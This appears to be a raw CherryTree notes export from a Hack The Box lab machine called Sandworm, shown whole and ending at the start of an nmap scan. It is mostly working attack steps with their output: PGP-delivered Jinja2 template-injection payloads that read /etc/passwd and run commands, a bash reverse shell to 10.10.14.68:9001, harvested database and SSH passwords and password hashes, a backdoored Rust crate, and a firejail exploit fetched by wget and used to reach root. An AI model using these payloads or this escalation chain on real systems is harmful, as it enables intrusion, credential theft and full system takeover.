m5RTd62UMoAY1G3/N1ChLrsbhBWZwJJeHfY6SOJoFt8OQ1p2Ag6zAg4FABEBAAHN
Int7Y29uZmlnLml0ZW1zKCl9fSA8dGVzdEB0ZXN0LmNvbT7CugQTAQoAJAUCZNTr
+QIbLwMLCQcDFQoIAh4BAheAAxYCAQIZAQUJAAAAAAAKCRDJumQSlkLBA7JVA/4g
ZC81H+s8WlI7oX46dvGyhOQ8uzb9vtGj+PQahyfKwppPSuTbMuiMP0sE9NZjsBaQ
ZBb5RjdJKbsTBmJM017UXWsETklxAliBajN+Kou2e0W5Ath8jQZL4ArsxwoySErV
OMXFTRmY80nVSmNiC4orrMtNtYkgwBjab/pEzGXQPc6NBGTU6/kBBADXw8IXqE4Y
GdYEnwkdVUgMEo6TgUKhmGrew9zh2H2z7NW/f1B8gg2U43FZBTsUT9n2OPAhrzOS
mojcstDSK/IQoieZXM0/58SmJZtQtA/nq++jxsI9T73+/qEApNeweDiehlr3lpDp
9wLW9aHnXa72ICxHZXMyxuukUjiPT2psuwARAQABwsCDBBgBCgAPBQJk1Ov5BQkA
AAAAAhsuAKgJEMm6ZBKWQsEDnSAEGQEKAAYFAmTU6/kACgkQXstf8GXGJ9a1vwQA
oi0U6TfSau2ZNS5V+PEhhF3OS50JNvNB2rJmi3kM36L0Z7rFpeD1uSEVxY5Ye0Ui
hrPTgZXswJ48N5f7FZaCsj2+wP4H9fks2hcFg2LCU4Bkm/K132Z5YdMgCJ79EwSL
tnRhk67YCW2PR4dcdzv/qKUx5tSagYOGjCcpWyKEpR4AUwP/dq6xpDZtFu1JcKW2
lRLy5qmKBGnJWBQ0EvmE7CjvNRJo7QnJNvx5UvVydrFPcNxqIKUj/iaVk0VMIkG7
uPRiSgHWB/Aq+Jz7lw9ZilBqSGr2OdB008pg/KBPdsu/uimC4UnxnbPFub4ll6Yv
wJ0mfUEKND0VYiEzZV/hTDKS1cDOjQRk1Ov5AQQA0s/5jLrHmftbsXV1voysfANY
ZULI1UHY0sGWMf7AOBZPuWzo+No4Z1vU6bnW/7ob68ypHJQox9Vtb7eg9rLuTih1
uCL1f8Ibo9+y4NM+iNe/fOpSWCw5f2Q52qLI4c++tgU8ur9Bl8A6Sc0AvmczcqE8
hwj7OvtrPS2uaWeVdR0AEQEAAcLAgwQYAQoADwUCZNTr+QUJAAAAAAIbLgCoCRDJ
umQSlkLBA50gBBkBCgAGBQJk1Ov5AAoJEFlJa+uOFobMym0D/jrZ2GQChQYNxTBc
8ofnUSutf1OvZ0cPRiElqibXyTPETPZ0vWEMKm0ljfab9YZwM3II+skxOx948G5/
ogszFv183NvoILz/0EJ4SlEnALNn6Ar85xoWxcEz6T5G7SYgNsbVStmvqHWd0Cho
ehLVsGhv72zlilBaFUPoPBqqjho+ZN4D/AvKl388IGHysGQqT0b+yo/eYGCFWwUV
5AYJ/PJkaGDurmRO8sHjYWk9SwO+Fxke7ubAUft29SQ9jFqtj9N5pVEpVAFxCOuY
kdpbnSZ2yDKgQYrC71dcSkVtoeQ8yzAtsJhOM0VFq3qKFkZgaJrRWCS59B6URkN9
1TDV19a2OUaR
=dZig
-----END PGP PUBLIC KEY BLOCK-----


-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: Keybase OpenPGP v2.0.76
Comment: </rich_text>
        <rich_text link="webs https://keybase.io/crypto">https://keybase.io/crypto</rich_text>
        <rich_text>

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
=z8pn
-----END PGP PRIVATE KEY BLOCK-----


then sign the key

enter on </rich_text>
        <rich_text link="webs https://ssa.htb/guide">https://ssa.htb/guide</rich_text>
        <rich_text> verify signature


ignature is valid! [GNUPG:] NEWSIG gpg: Signature made Thu 10 Aug 2023 01:54:36 PM UTC gpg: using RSA key 59496BEB8E1686CC [GNUPG:] KEY_CONSIDERED 06727E1E6DBB629AC07CF79FC9BA64129642C103 0 [GNUPG:] SIG_ID RzoZqOyr/Psbmyzre3gDtvTd34I 2023-08-10 1691675676 [GNUPG:] KEY_CONSIDERED 06727E1E6DBB629AC07CF79FC9BA64129642C103 0 [GNUPG:] GOODSIG 59496BEB8E1686CC dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', '91668c1bc67132e3dcfb5b1a3e0c5c21'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', None), ('JSON_SORT_KEYS', None), ('JSONIFY_PRETTYPRINT_REGULAR', None), ('JSONIFY_MIMETYPE', None), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'), ('SQLALCHEMY_ENGINE_OPTIONS', {}), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_BINDS', {}), ('SQLALCHEMY_RECORD_QUERIES', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False)]) gpg: Good signature from "dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', '91668c1bc67132e3dcfb5b1a3e0c5c21'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', None), ('JSON_SORT_KEYS', None), ('JSONIFY_PRETTYPRINT_REGULAR', None), ('JSONIFY_MIMETYPE', None), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'), ('SQLALCHEMY_ENGINE_OPTIONS', {}), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_BINDS', {}), ('SQLALCHEMY_RECORD_QUERIES', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False)]) " [unknown] [GNUPG:] VALIDSIG A6B7B39CA520C5F26FAC21B059496BEB8E1686CC 2023-08-10 1691675676 0 4 0 1 10 00 06727E1E6DBB629AC07CF79FC9BA64129642C103 [GNUPG:] KEY_CONSIDERED 06727E1E6DBB629AC07CF79FC9BA64129642C103 0 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 0672 7E1E 6DBB 629A C07C F79F C9BA 6412 9642 C103 Subkey fingerprint: A6B7 B39C A520 C5F2 6FAC 21B0 5949 6BEB 8E16 86CC


SQLALCHEMY_DATABASE_URI', 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'),   atlas:GarlicAndOnionZ42


{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}


Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Thu 10 Aug 2023 02:01:35 PM UTC gpg: using RSA key 3D43536BCBC94CB2 [GNUPG:] KEY_CONSIDERED C692880606501AB70D589BBB45FBF28EFD722595 0 [GNUPG:] SIG_ID XxcoeFWMEny7WD2rIKaN6AuIEP0 2023-08-10 1691676095 [GNUPG:] KEY_CONSIDERED C692880606501AB70D589BBB45FBF28EFD722595 0 [GNUPG:] GOODSIG 3D43536BCBC94CB2 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false silentobserver:x:1001:1001::/home/silentobserver:/bin/bash atlas:x:1000:1000::/home/atlas:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false gpg: Good signature from "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false silentobserver:x:1001:1001::/home/silentobserver:/bin/bash atlas:x:1000:1000::/home/atlas:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false " [unknown] [GNUPG:] VALIDSIG 66E5873CE23C18F1AFA407783D43536BCBC94CB2 2023-08-10 1691676095 0 4 0 1 10 00 C692880606501AB70D589BBB45FBF28EFD722595 [GNUPG:] KEY_CONSIDERED C692880606501AB70D589BBB45FBF28EFD722595 0 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: C692 8806 0650 1AB7 0D58 9BBB 45FB F28E FD72 2595 Subkey fingerprint: 66E5 873C E23C 18F1 AFA4 0778 3D43 536B CBC9 4CB2


{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}


Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Thu 10 Aug 2023 02:12:38 PM UTC gpg: using RSA key 27CE060D20E23729 [GNUPG:] KEY_CONSIDERED 9EACAF6C0440447A980BB7988640B22B5BCFDC08 0 [GNUPG:] SIG_ID uk8eV6q6CWPBvN2nlDfqXk4JBzM 2023-08-10 1691676758 [GNUPG:] KEY_CONSIDERED 9EACAF6C0440447A980BB7988640B22B5BCFDC08 0 [GNUPG:] GOODSIG 27CE060D20E23729 uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) gpg: Good signature from "uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) " [unknown] [GNUPG:] VALIDSIG C9C74563FFC3099C62D9C50E27CE060D20E23729 2023-08-10 1691676758 0 4 0 1 10 00 9EACAF6C0440447A980BB7988640B22B5BCFDC08 [GNUPG:] KEY_CONSIDERED 9EACAF6C0440447A980BB7988640B22B5BCFDC08 0 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 9EAC AF6C 0440 447A 980B B798 8640 B22B 5BCF DC08 Subkey fingerprint: C9C7 4563 FFC3 099C 62D9 C50E 27CE 060D 20E2 3729


we have RCE

/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.14.68/9001 0&gt;&amp;1’

{{ self.__init__.__globals__.__builtins__.__import__('os').popen("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.68/9001 0&gt;&amp;1'").read() }}


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.68] from (UNKNOWN) [10.129.229.16] 53776
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ whoami
whoami
Could not find command-not-found database. Run 'sudo apt update' to populate it.
whoami: command not found
atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/var/www/html/SSA$ 

python3 -c 'import pty;pty.spawn("/bin/bash")'
control + z
stty raw -echo
fg
export TERM=xterm

atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json 
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "</rich_text>
        <rich_text link="webs https://httpie.io/docs#sessions">https://httpie.io/docs#sessions</rich_text>
        <rich_text>",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}



ssh silentobserver@ssa.htb
silentobserver@ssa.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31
silentobserver@sandworm:~$ ls
user.txt
silentobserver@sandworm:~$ cat user.txt 
3b9cc97859fc9fb624fd0d1b63290935


silentobserver@sandworm:~$ mysql -h 127.0.0.1 -u atlas -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 869
Server version: 8.0.33-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| SSA                |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use SSA;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+---------------+
| Tables_in_SSA |
+---------------+
| users         |
+---------------+
1 row in set (0.00 sec)

mysql&gt; select * from users;
+----+----------------+--------------------------------------------------------------------------------------------------------+
| id | username       | password                                                                                               |
+----+----------------+--------------------------------------------------------------------------------------------------------+
|  1 | Odin           | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f |
|  2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d |
+----+----------------+--------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)


run linpeas.sh


-rwsrwxr-x 2 atlas atlas 57M Jun  6 10:00 /opt/tipnet/target/debug/tipnet (Unknown SUID binary!)
-rwsrwxr-x 1 atlas atlas 54M May  4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 (Unknown SUID binary!)
-rwsrwxr-x 2 atlas atlas 57M Jun  6 10:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 (Unknown SUID binary!)
-rwsr-x--- 1 root jailer 1.7M Nov 29  2022 /usr/local/bin/firejail (Unknown SUID binary!)


drwxrwxr-x 7 atlas atlas 4096 Feb  7  2023 /home/atlas/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
drwxrwxr-x 7 silentobserver silentobserver 4096 May  4 17:11 /home/silentobserver/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
drwxrwxr-x 6 atlas silentobserver 4096 May  4 17:08 /opt/crates/logger/.git
drwxr-xr-- 6 root atlas 4096 Jun  6 11:49 /opt/tipnet/.git


/core in root


fn connect_to_db(db: &amp;str) -&gt; Result&lt;mysql::PooledConn&gt; {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}



</rich_text>
        <rich_text link="webs https://github.com/LukeDSchenk/rust-backdoors">https://github.com/LukeDSchenk/rust-backdoors</rich_text>
        <rich_text>


create main.rs

change main to log and function name to 

pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {

nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.68] from (UNKNOWN) [10.129.229.16] 42262
bash: cannot set terminal process group (71144): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:/opt/tipnet$ 
atlas@sandworm:/opt/tipnet$ 
atlas@sandworm:/opt/tipnet$ 
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:/opt/tipnet$ ls
ls
access.log
Cargo.lock
Cargo.toml
src
target
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:/opt/tipnet$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied
atlas@sandworm:/opt/tipnet$ 


</rich_text>
        <rich_text link="webs https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/</rich_text>
        <rich_text>


# Download it in local machine
wget https://www.openwall.com/lists/oss-security/2022/06/08/10/1 -O exploit.py

# Transfer it to target machine
wget http://&lt;local-ip&gt;:8000/exploit.py
python3 exploit.py &amp;
firejail --join=&lt;PID&gt;
su -

this shell must fist be upgraded

atlas@sandworm:/dev/shm$ python3 -c 'import pty;pty.spawn("/bin/bash")'

atlas@sandworm:/dev/shm$ python3 exploit.py &amp;
python3 exploit.py &amp;
[1] 73311
atlas@sandworm:/dev/shm$ You can now run 'firejail --join=73316' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
atlas@sandworm:/dev/shm$ You can now run 'firejail --join=73316' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
firejail --join=73316
firejail --join=73316
changing root to /proc/73316/root
Warning: cleaning all supplementary groups
Child process initialized in 4.17 ms
atlas@sandworm:/dev/shm$ 

atlas@sandworm:/dev/shm$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/dev/shm$ su -
su -
root@sandworm:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~#
root@sandworm:~# cat /root/root.txt
cat /root/root.txt
0352270476db8edb7b4ef2aecfcf0eb7</rich_text>
      </node>
    </node>
    <node name="Format" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691747091" ts_lastsave="1692002785">
      <node name="nmap" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691747095" ts_lastsave="1691747252">
        <rich_text>cat nmap/all.nmap
# Nmap 7.94 scan initiated Fri Aug 11 05:46:43 2023 as: nmap -p- -sC -sV -oA nmap/all -v 10.129.229.3
Nmap scan report for 10.129.229.3
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (reset)
